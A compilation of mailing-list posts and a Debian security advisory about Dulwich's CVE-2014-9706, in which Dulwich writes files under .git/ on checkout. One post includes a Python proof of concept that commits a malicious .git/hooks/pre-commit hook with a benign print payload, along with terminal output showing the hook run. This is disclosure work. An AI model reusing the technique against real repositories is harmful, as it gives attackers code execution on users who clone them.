=== Content from lists.launchpad.net_93c1e1f7_20250124_135903.html ===

[‚Üê
Back to team overview](https://launchpad.net/~dulwich-users)
# dulwich-users team mailing list archive

* [Thread](maillist.html)
* [Date](date.html)

1. ![](https://launchpad.net/@@/team)
   [dulwich-users team](https://launchpad.net/~dulwich-users)
2. [Mailing list archive](maillist.html)
3. Message #00827

## Re: Git vulnerability CVE-2014-9390

|  | [Thread Previous](msg00826.html) ‚Ä¢ [Date Previous](msg00826.html) ‚Ä¢ [Date Next](msg00828.html) ‚Ä¢ [Thread Next](msg00828.html) |
| --- | --- |

* ****To****:
  Andi McClure <andi.m.mcclure@xxxxxxxxx>
* ****From****:
  Gary van der Merwe <garyvdm@xxxxxxxxx>
* ****Date****:
  Fri, 19 Dec 2014 00:57:33 +0200
* ****Cc****:
  dulwich-users <dulwich-users@xxxxxxxxxxxxxxxxxxx>
* ****In-reply-to****:
  <CAJDLOYLGjkZrFVTYtd=ZKaipNzGbs28kKtnxwOxyunOz5md-Vw@mail.gmail.com>

---

```
On Thu, Dec 18, 2014 at 11:45 PM, Andi McClure <andi.m.mcclure@xxxxxxxxx> wrote:
>
> News is going around today about a potential-remote-code-execution vulnerability in the standard git clients:
>
> <https://github.com/blog/1938-git-client-vulnerability-announced>
>
> Is Dulwich potentially affected?

Yes. And not only on case insensitive file systems, like with git, but
always :-(

I've attached a file to demonstrate it. It creates a repo with a
commit of a .git/hooks/pre-commit file. Git prevents writing this file
to the working tree, but dulwich happily writes it out.

/tmp % ./cve-2014-9390-create.py
/tmp % cd cve-2014-9390-repo.git
/tmp/cve-2014-9390-repo.git (git)-[master] % git reset --hard
error: Invalid path '.git/hooks/pre-commit'
HEAD is now at 1c27312 Evil commit
/tmp/cve-2014-9390-repo.git (git)-[master] % dulwich reset --hard
/tmp/cve-2014-9390-repo.git (git)-[master] % git commit -m "test" --allow-empty
You just got cracked! (not really but you could have been!)
[master 29a7100] test

For my own use cases of dulwich, I'm not affected by this as I only
ever read and write directly to repos with dulwich with out checking
out trees to a working tree.  Do other users actually use the dulwich
index module, or porcilian commands.

How do we fix this? I assume we start by filtering what we write in
dulwich.index.build_index_from_tree? Filtering the case sensitive and
case insensitive cases is easy, but some of the other edge cases
("git~1" on windows, ".g\u200cit" on HFS+) are a little more tricky.
Do we care about preventing a user from adding these paths to the
index?

Gary

```
```
#!/usr/bin/env python2

import os
import time

from dulwich.repo import Repo
from dulwich.objects import Blob, Tree, Commit,  parse_timezone

repo_dir = 'cve-2014-9390-repo.git'
os.mkdir(repo_dir)
repo = Repo.init(repo_dir)

evil_file = Blob.from_string("""#!/usr/bin/env python

print('You just got cracked! (not really but you could have been!)')
""")

hooks_tree = Tree()
hooks_tree.add('pre-commit', 0o100755, evil_file.id)

git_tree = Tree()
git_tree.add('hooks', 0o40000, hooks_tree.id)

root_tree = Tree()
root_tree.add('.git', 0o40000, git_tree.id)

commit = Commit()
commit.tree = root_tree.id
author = "Dr. Evil <drevil@xxxxxxxxxxx>"
commit.author = commit.committer = author
commit.commit_time = commit.author_time = int(time.time())
tz = parse_timezone('-0200')[0]
commit.commit_timezone = commit.author_timezone = tz
commit.encoding = "UTF-8"
commit.message = "Evil commit"

repo.object_store.add_objects([
    (evil_file, None),
    (hooks_tree, None),
    (git_tree, None),
    (root_tree, None),
    (commit, None),
])

repo.refs['refs/heads/master'] = commit.id

```

---

### Follow ups

* **[Re: Git vulnerability CVE-2014-9390](msg00828.html)**

  From: Jelmer Vernooij, 2014-12-19

### References

* **[Git vulnerability CVE-2014-9390](msg00826.html)**

  From: Andi McClure, 2014-12-18

|  | [Thread Previous](msg00826.html) ‚Ä¢ [Date Previous](msg00826.html) ‚Ä¢ [Date Next](msg00828.html) ‚Ä¢ [Thread Next](msg00828.html) |
| --- | --- |

[![Launchpad](https://launchpad.net/@@/launchpad-logo-and-name-hierarchy.png)](https://launchpad.net/)
¬†‚Ä¢
[Take the tour](https://launchpad.net/%2Btour)
¬†‚Ä¢
[Read the guide](https://help.launchpad.net/)
¬†‚Ä¢
[Help for mailing lists](https://help.launchpad.net/Teams/MailingLists)

¬© 2004-2012
[Canonical¬†Ltd.](http://canonical.com/)
¬†‚Ä¢
[Terms of use](https://launchpad.net/legal)
¬†‚Ä¢
[Contact Launchpad Support](/support)
¬†‚Ä¢
[System status](http://identi.ca/launchpadstatus)



=== Content from www.openwall.com_57cfb927_20250124_135902.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux ¬† *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper ¬† *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists ¬† *for password cracking*](/wordlists/)+ [passwdqc ¬† *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt ¬† *KDF & password hashing*](/yescrypt/)+ [yespower ¬† *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish ¬† *password hashing*](/crypt/)+ [phpass ¬† *ditto in PHP*](/phpass/)+ [tcb ¬† *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd ¬† *port scan detector*](/scanlogd/)+ [popa3d ¬† *tiny POP3 daemon*](/popa3d/)+ [blists ¬† *web interface to mailing lists*](/blists/)+ [msulogin ¬† *single user mode login*](/msulogin/)+ [php\_mt\_seed ¬† *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Hash Suite - Windows password security audit tool. GUI, reports in PDF.](https://hashsuite.openwall.net) | | --- | |
| --- | --- |

[[<prev]](25) [[next>]](27) [[<thread-prev]](../../../2015/03/21/1) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-Id: <20150322174207.F18F16C001C@smtpvmsrv1.mitre.org>
Date: Sun, 22 Mar 2015 13:42:07 -0400 (EDT)
From: cve-assign@...re.org
To: carnil@...ian.org
Cc: cve-assign@...re.org, oss-security@...ts.openwall.com, jelmer@...ian.org
Subject: Re: Possible CVE Request: dulwich: does not prevent to write files in commits with invalid paths to working tree

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

> Does the scope of CVE-2014-9390 also include these bits
> from the above:

> dulwich happily clones a repository which contains commit with invalid
> paths, say .git/hooks/pre-commit, and thus allowing execution of code
> on subsequent commits.

No, the scope of CVE-2014-9390 does not include that. Use
CVE-2014-9706 for this vulnerability in dulwich.

The scope of CVE-2014-9390 is currently undefined, in part because
<http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-9390>
intentionally doesn't have any related information. Usage of
CVE-2014-9390 is, very roughly, concerned with "The string .git/ for a
directory name has always been considered Very Special. Therefore,
other strings with equivalence relationships to .git/ must also be
considered Very Special."

The root cause of the problem in dulwich seems to be "The string .git/
for a directory name was not considered Very Special." This is
completely distinct conceptually, and is a much simpler case for CVE
coverage.

There are two types of concerns with CVE-2014-9390. First,
CVE-2014-9390 can only apply to omitted equivalence-relationship
handling in source code that is, or is directly copied from, "Git
before 1.8.5.6, 1.9.x before 1.9.5, 2.0.x before 2.0.5, 2.1.x before
2.1.4, and 2.2.x before 2.2.1" source code. It is not possible to have
a CVE for a cross-implementation vulnerability class of this
equivalence-relationship handling. Second, usage of CVE-2014-9390
seems to span multiple types of problems, possibly including all of:

  <http://cwe.mitre.org/data/definitions/178.html>
  <http://cwe.mitre.org/data/definitions/180.html>
  <http://cwe.mitre.org/data/definitions/182.html>

- --
CVE assignment team, MITRE CVE Numbering Authority
M/S M300
202 Burlington Road, Bedford, MA 01730 USA
[ PGP key available through <http://cve.mitre.org/cve/request_id.html> ]
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.14 (SunOS)

iQEcBAEBAgAGBQJVDv4oAAoJEKllVAevmvmsH7EH/3hpPNXiEwIlDR24GR1NuYfi
74PTVtFPPWDajblRV+RTMbZbxp2MdtUR2AmvYYUF5YyqTAOiGm0tWB6EVARhXCMu
QBzYu/9MMUTw2cajei33bFpTfQ+M0XeYBK6Mx7hw86j4zMT2gWSzN05CDcXyaFtC
y02TbwLTGv4CShWlN3ArMaBRYhBRxtF51VnbMvYeygZokdIdNAO9VULshgbBLijc
ZMs4yH9wje9Lctz/x5T2nKEW24pm8pHQAs7v8WwWtSnQ0FfTo5vjdu+iT4zpaOSB
MYmFxjBy4T4YaWQaO/XUP+IUue1lkuwY9olTYCpTVxhD6wAY86MTSDro1QNugFk=
=sxen
-----END PGP SIGNATURE-----

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from www.debian.org_fbbb0409_20250124_135902.html ===


---

[[Date Prev](msg00092.html)][[Date Next](msg00094.html)]
[[Thread Prev](msg00092.html)][[Thread Next](msg00094.html)]
[[Date Index](maillist.html#00093)]
[[Thread Index](threads.html#00093)]

# [SECURITY] [DSA 3206-1] dulwich security update

---

* *To*: debian-security-announce@lists.debian.org
* *Subject*: [SECURITY] [DSA 3206-1] dulwich security update
* *From*: Salvatore Bonaccorso <carnil@debian.org>
* *Date*: Sat, 28 Mar 2015 13:22:01 +0000
* *Message-id*: <[[üîé]](/msgid-search/E1Ybqgb-0006M9-5D%40master.debian.org)¬†[E1Ybqgb-0006M9-5D@master.debian.org](msg00093.html)>
* *Reply-to*: debian-security@lists.debian.org

---

```
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512

- -------------------------------------------------------------------------
Debian Security Advisory DSA-3206-1                   security@debian.org
<http://www.debian.org/security/>                      Salvatore Bonaccorso
March 28, 2015                         <http://www.debian.org/security/faq>
- -------------------------------------------------------------------------

Package        : dulwich
CVE ID         : CVE-2014-9706 CVE-2015-0838
Debian Bug     : 780958 780989

Multiple vulnerabilities have been discovered in Dulwich, a Python
implementation of the file formats and protocols used by the Git version
control system. The Common Vulnerabilities and Exposures project
identifies the following problems:

CVE-2014-9706

    It was discovered that Dulwich allows writing to files under .git/
    when checking out working trees. This could lead to the execution of
    arbitrary code with the privileges of the user running an
    application based on Dulwich.

CVE-2015-0838

    Ivan Fratric of the Google Security Team has found a buffer
    overflow in the C implementation of the apply_delta() function,
    used when accessing Git objects in pack files. An attacker could
    take advantage of this flaw to cause the execution of arbitrary
    code with the privileges of the user running a Git server or client
    based on Dulwich.

For the stable distribution (wheezy), these problems have been fixed in
version 0.8.5-2+deb7u2.

For the upcoming stable distribution (jessie), these problems have been
fixed in version 0.9.7-3.

For the unstable distribution (sid), these problems have been fixed in
version 0.10.1-1.

We recommend that you upgrade your dulwich packages.

Further information about Debian Security Advisories, how to apply
these updates to your system and frequently asked questions can be
found at: <https://www.debian.org/security/>

Mailing list: debian-security-announce@lists.debian.org
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1

iQIcBAEBCgAGBQJVFqrBAAoJEAVMuPMTQ89EXMIQAJTFthRtXilrRtR2zW2h254v
PjR2wH/Hx+9CUTTFinYea9IM1J3OldiTs4Kzie6imI8ZAkla0XKVgmCYAFGSuR29
leyGgF/q62CzJkY+qiK1RAhWmCKNxt5nawhxo2Ss3BQL3YgwfaVAUZplkbTWsoNw
N2o/g0/9CQCkj8fUy+WbzPiLlZ1q6sZLgTKXtc3RCFQmF6zOCSHieruDrjeFPpJh
H1sw5fxsuwgibuOMHD+2vqXNCUNO+fWNfr5vmLQuIdqLuGX5E7b8k0fujQvcOJP2
TCDaMC8wrPLEWToH0qXhL/FwCkI0tpKJCzXS0XwwF3E5UwEjtkzWylGhxPBuP2mw
wt1nBng18EBGu58Iaoo/9DoM58Nan6auDinLYaciBPH+Q1221EWUqBZO5yOAhxDM
xD9o/QKEVFqq9Q3dk6Vxekf4WERDIbsBN1B7SA9+pHO3GYaMcwAOhUmdaRyuweWq
9dlCwoyagkYxljo+ZW1WCFvClrmF42hdv+H4sg6DD7MLzB+feQBzTUWxW12rTHU0
B8f6aA47Ccm7Ht8OEF93ojvfHurOF7S3T+qsqT/g2M8pEH/Q6sSq+YpOEY3J2IOs
JEbLf4eNgqRoL0/N12tE5d+9UvTlVMw9kFeeBrm8Yz4fwq4MHd5I28UX96AUhhvV
ymN7Sgsu5iQwJLa0CCoD
=OotG
-----END PGP SIGNATURE-----

```

---



=== Content from www.openwall.com_21bcab6c_20250124_135902.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux ¬† *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper ¬† *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists ¬† *for password cracking*](/wordlists/)+ [passwdqc ¬† *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt ¬† *KDF & password hashing*](/yescrypt/)+ [yespower ¬† *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish ¬† *password hashing*](/crypt/)+ [phpass ¬† *ditto in PHP*](/phpass/)+ [tcb ¬† *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd ¬† *port scan detector*](/scanlogd/)+ [popa3d ¬† *tiny POP3 daemon*](/popa3d/)+ [blists ¬† *web interface to mailing lists*](/blists/)+ [msulogin ¬† *single user mode login*](/msulogin/)+ [php\_mt\_seed ¬† *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Hash Suite - Windows password security audit tool. GUI, reports in PDF.](https://hashsuite.openwall.net) | | --- | |
| --- | --- |

[[<prev]](../../../2015/03/20/19) [[next>]](2) [[thread-next>]](../../../2015/03/22/26) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID: <20150321092624.GA10087@eldamar.local>
Date: Sat, 21 Mar 2015 10:26:24 +0100
From: Salvatore Bonaccorso <carnil@...ian.org>
To: OSS Security Mailinglist <oss-security@...ts.openwall.com>
Cc: CVE Assignments MITRE <cve-assign@...re.org>,
	Jelmer Vernooij <jelmer@...ian.org>
Subject: Possible CVE Request: dulwich: does not prevent to write files in
 commits with invalid paths to working tree

Hi,

While looking at CVE-2014-9390 I noticed
<https://lists.launchpad.net/dulwich-users/msg00827.html> for dulwich reported by
Gary van der Merwe. Does the scope of CVE-2014-9390 also include these bits
from the above:

dulwich happily clones a repository which contains commit with invalid
paths, say .git/hooks/pre-commit, and thus allowing execution of code
on subsequent commits.

----cut---------cut---------cut---------cut---------cut---------cut-----
dummy@sid:~$ python PoC.py
dummy@sid:~$ dulwich clone PoC.git foo
Counting objects: 5, done.
Compressing objects: 100% (2/2), done.
Total 5 (delta 0), reused 5 (delta 0)
Checking out HEADdummy@sid:~$ cd foo/
dummy@sid:~/foo$ git commit -m "test" --allow-empty
You just got cracked! (not really but you could have been!)
[master 9588153] test
dummy@sid:~/foo$ ls -l /tmp/cracked
-rw-r--r-- 1 dummy dummy 0 Mar 21 10:24 /tmp/cracked
dummy@sid:~/foo$
----cut---------cut---------cut---------cut---------cut---------cut-----

Upstream (Jelmer Vernooij) has fixed this with commit

<https://git.samba.org/?p=jelmer/dulwich.git;a=commitdiff;h=091638be3c89f46f42c3b1d57dc1504af5729176>

Does this need a separate CVE from CVE-2014-9390?

Regards,
Salvatore

View attachment "[PoC.py](1/1)" of type "text/x-python" (1135 bytes)

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).


